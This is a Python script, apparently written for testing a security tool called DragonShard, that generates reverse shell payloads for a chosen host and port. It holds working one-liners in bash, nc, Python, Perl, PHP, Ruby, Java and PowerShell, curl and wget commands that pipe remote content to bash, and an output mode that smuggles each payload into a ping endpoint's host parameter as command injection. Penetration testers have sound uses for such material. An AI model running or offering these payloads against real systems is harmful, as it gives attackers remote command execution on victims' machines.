#!/usr/bin/env python3
"""
Reverse Shell Payload Generator

Generates various reverse shell payloads for testing DragonShard.
"""

import sys
import argparse


def generate_payload(host, port):
    """Generate reverse shell payloads for the given host and port."""
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "nc": f"nc {host} {port} -e /bin/bash",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
        "curl": f"curl -s {host}:{port} | bash",
        "wget": f"wget -qO- {host}:{port} | bash",
        "perl": f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "php": f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby": f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{host}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        "java": f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();",
        "powershell": f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    }
    return payloads


def main():
    """Main function."""
    parser = argparse.ArgumentParser(description="Generate reverse shell payloads")
    parser.add_argument("host", help="Target host")
    parser.add_argument("port", help="Target port")
    parser.add_argument("--format", choices=["text", "json", "url"], default="text", 
                       help="Output format (default: text)")
    
    args = parser.parse_args()
    payloads = generate_payload(args.host, args.port)
    
    if args.format == "json":
        import json
        print(json.dumps(payloads, indent=2))
    elif args.format == "url":
        print(f"# Reverse Shell Payloads for {args.host}:{args.port}")
        print("=" * 60)
        for name, payload in payloads.items():
            encoded = payload.replace('"', '%22').replace(' ', '%20')
            print(f"\n{name.upper()}:")
            print(f"curl \"http://localhost:8080/ping?host=127.0.0.1;{encoded}\"")
    else:
        print("Reverse Shell Payloads:")
        print("=" * 60)
        for name, payload in payloads.items():
            print(f"\n{name.upper()}:")
            print(payload)


if __name__ == "__main__":
    main() 